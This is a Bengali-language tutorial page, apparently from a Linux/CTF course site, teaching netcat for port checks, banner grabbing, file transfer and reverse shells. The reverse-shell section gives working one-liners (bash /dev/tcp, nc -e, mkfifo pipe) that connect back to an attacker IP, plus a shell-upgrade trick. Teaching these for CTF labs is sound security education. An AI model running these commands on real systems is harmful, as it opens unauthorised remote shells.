@@ -1,0 +1,225 @@
+---
+title: Netcat
+description: Netcat — network-এর Swiss Army Knife। Port check, banner grab, file transfer, reverse shell।
+---
+
+import { Callout, Tabs } from 'nextra/components'
+
+# Netcat
+
+<Callout type="info">
+  Netcat (nc) কে বলা হয় "network-এর Swiss Army Knife"। এটা দিয়ে port check, service banner দেখা, file transfer, এবং CTF/pentesting-এর সবচেয়ে গুরুত্বপূর্ণ কাজ — reverse shell। একটাই tool, অনেক কাজ।
+</Callout>
+
+## Netcat কী করে
+
+**Netcat মূলত দুটো machine-এর মধ্যে raw TCP/UDP connection তৈরি করে।**
+
+এই connection দিয়ে তুমি যা খুশি পাঠাতে পারো — text, file, commands। এই simplicity-ই এটাকে এত powerful করে।
+
+```
+Machine A (তুমি)  ←──TCP connection──→  Machine B (target/server)
+    nc                                        nc
+```
+
+## Installation
+
+```bash filename="Terminal"
+# Ubuntu/Debian
+sudo apt install netcat-openbsd
+
+# Version check
+nc -h
+
+# Traditional netcat (কিছু CTF-এ এটা লাগে)
+sudo apt install netcat-traditional
+```
+
+<Callout type="default">
+  **`nc` vs `ncat`:** Kali Linux-এ `ncat` থাকে (Nmap-এর version)। Ubuntu-তে `nc` থাকে। দুটোর syntax প্রায় একই। CTF-এ যেটা available সেটা ব্যবহার করো।
+</Callout>
+
+## Port Check
+
+Port open কিনা দেখো — nmap ছাড়া।
+
+```bash filename="Terminal"
+# একটা port open কিনা দেখো
+nc -zv 192.168.1.100 22
+# -z = connect করো কিন্তু data পাঠিও না
+# -v = verbose output
+# Output: Connection to 192.168.1.100 22 port [tcp/ssh] succeeded!
+
+# Port range scan করো
+nc -zv 192.168.1.100 20-80
+
+# Timeout set করো — ৩ সেকেন্ড
+nc -zv -w 3 192.168.1.100 443
+```
+
+## Banner Grabbing
+
+Service connect করে দেখো কী response পাঠায় — version, software বের হয়।
+
+```bash filename="Terminal"
+# SSH banner grab
+nc 192.168.1.100 22
+# Output: SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.6
+
+# HTTP server info
+echo "HEAD / HTTP/1.0" | nc 192.168.1.100 80
+# Output: Server: Apache/2.4.41
+
+# FTP banner
+nc 192.168.1.100 21
+# Output: 220 vsftpd 3.0.3
+```
+
+**কেন banner grabbing কাজে লাগে:** Software version জানলে সেই version-এ known vulnerability আছে কিনা খুঁজতে পারো।
+
+## Chat / Connection
+
+দুটো terminal-এ nc চালিয়ে সরাসরি message পাঠানো যায়।
+
+<Tabs items={['Server side (listens)', 'Client side (connects)']}>
+  <Tabs.Tab>
+    ```bash filename="Terminal"
+    # Port 4444-এ listen করো
+    nc -lvnp 4444
+    # -l = listen mode
+    # -v = verbose
+    # -n = numeric (DNS resolve করো না)
+    # -p = port number
+    ```
+  </Tabs.Tab>
+  <Tabs.Tab>
+    ```bash filename="Terminal"
+    # Server-এ connect করো
+    nc 192.168.1.100 4444
+
+    # এখন দুদিক থেকে message টাইপ করা যাবে
+    ```
+  </Tabs.Tab>
+</Tabs>
+
+## File Transfer
+
+<Tabs items={['Receiver (আগে চালাও)', 'Sender']}>
+  <Tabs.Tab>
+    ```bash filename="Terminal"
+    # File receive করার জন্য listen করো
+    nc -lvnp 4444 > received_file.txt
+    ```
+  </Tabs.Tab>
+  <Tabs.Tab>
+    ```bash filename="Terminal"
+    # File পাঠাও
+    nc 192.168.1.100 4444 < file_to_send.txt
+
+    # Binary file (zip, exe)
+    nc 192.168.1.100 4444 < exploit.zip
+    ```
+  </Tabs.Tab>
+</Tabs>
+
+<Callout type="default">
+  **File transfer কখন কাজে লাগে:** CTF-এ target machine-এ shell পাওয়ার পর — সেই machine থেকে file নিয়ে আসতে বা exploit পাঠাতে nc file transfer ব্যবহার হয়।
+</Callout>
+
+## Reverse Shell
+
+**Reverse shell — CTF-এর সবচেয়ে গুরুত্বপূর্ণ concept।**
+
+সাধারণত তুমি target machine-এ connect করো। কিন্তু target machine firewall দিয়ে incoming connection block করতে পারে।
+
+**Reverse shell-এ উল্টোটা হয়:** target machine **তোমার machine-এ** connect করে। Firewall outgoing connection সাধারণত block করে না।
+
+```
+Normal:    তুমি ──connect──→ target   (firewall block করতে পারে)
+Reverse:   target ──connect──→ তুমি   (firewall সাধারণত block করে না)
+```
+
+**Step by step:**
+
+<Tabs items={['তোমার machine (attacker)', 'Target machine']}>
+  <Tabs.Tab>
+    ```bash filename="Terminal"
+    # Step 1: তোমার machine-এ listener চালু করো
+    nc -lvnp 4444
+
+    # তোমার IP জানো
+    ip a | grep "inet " | grep tun0
+    # ধরো: 10.10.14.5
+    ```
+  </Tabs.Tab>
+  <Tabs.Tab>
+    ```bash filename="Terminal"
+    # Step 2: Target machine-এ এই command চালাও (RCE/exploit দিয়ে)
+    bash -i >& /dev/tcp/10.10.14.5/4444 0>&1
+    # অথবা
+    nc 10.10.14.5 4444 -e /bin/bash
+    # অথবা (nc -e না থাকলে)
+    rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.10.14.5 4444 >/tmp/f
+    ```
+  </Tabs.Tab>
+</Tabs>
+
+Target command চালালে তোমার listener-এ shell পেয়ে যাবে:
+
+```bash filename="Terminal"
+# তোমার terminal-এ দেখবে:
+nc -lvnp 4444
+Listening on 0.0.0.0 4444
+Connection received on 10.10.10.50 54321
+
+# এখন target machine-এর shell তোমার হাতে:
+whoami
+www-data
+```
+
+<Callout type="warning">
+  **Reverse shell — কোথায় command আসে:** Target machine-এ কোনো vulnerability exploit করে বা web application-এ code execution পেলে সেখানে এই command চালাতে হয়। CTF-এ এটাই "initial foothold"।
+
+  **Shell upgrade করো** — nc shell অনেক সময় limited হয়:
+  ```bash filename="Terminal"
+  python3 -c 'import pty; pty.spawn("/bin/bash")'
+  # অথবা
+  script /dev/null -c bash
+  ```
+</Callout>
+
+## Quick Reference
+
+```bash filename="Terminal"
+# Port check
+nc -zv target 22
+
+# Banner grab
+nc target 80
+
+# Listen করো
+nc -lvnp 4444
+
+# File receive
+nc -lvnp 4444 > file.txt
+
+# File send
+nc target 4444 < file.txt
+
+# Reverse shell listener
+nc -lvnp 4444
+```
+
+## Quick Check
+
+- [ ] `nc -lvnp 4444` এর প্রতিটা flag কী করে?
+- [ ] Banner grabbing কেন করা হয়?
+- [ ] Reverse shell কেন normal connection-এর চেয়ে বেশি কার্যকর?
+- [ ] File transfer-এ receiver আর sender কোনটা আগে চালাতে হয় এবং কেন?
+- [ ] Reverse shell পাওয়ার পর shell upgrade কেন করবে?
+
+**পরবর্তী Section →** [Package Management](/docs/linux-fundamentals/08-package-management)
+
+<span style={{ display: 'none' }}>
+  Search Keywords: netcat linux bangla, nc reverse shell, netcat banner grabbing, nc file transfer, reverse shell CTF bengali, netcat port check, nc -lvnp
+</span>
